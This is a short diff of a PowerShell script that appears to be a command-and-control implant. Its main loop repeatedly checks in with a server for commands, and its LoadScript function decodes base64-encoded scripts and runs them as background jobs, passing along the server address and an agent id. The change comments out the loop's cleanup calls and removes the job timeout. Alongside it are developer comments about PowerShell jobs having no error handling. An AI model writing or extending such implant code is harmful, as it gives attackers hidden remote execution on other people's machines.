@@ -53,8 +53,8 @@ function Get-Info {
 function Main {
     Invoke-InitialConnection
     while ($true) {
-        ClearPowershell
-        ClearJobs
+        #ClearPowershell
+        #ClearJobs
         Invoke-CheckForCommands
         Start-Sleep -Seconds $global:ping_timer
     }
@@ -68,7 +68,10 @@ function LoadScript {
     try {
         $block = [Scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64_script)))
 
-        $started_job = Start-Job -ScriptBlock $block -ArgumentList $global:ip_port, $global:id | Wait-Job -Timeout $global:job_timeout
+        # there is 1 bad thing about jobs in powershell.
+        #THERE IS NO ERROR HANDLING FOR JOBS OR A CONSOLE TO WRITE TO.
+        #This means you'll have no idea if there is an error
+        $started_job = Start-Job -ScriptBlock $block -ArgumentList $global:ip_port, $global:id
     }
     catch {
     }
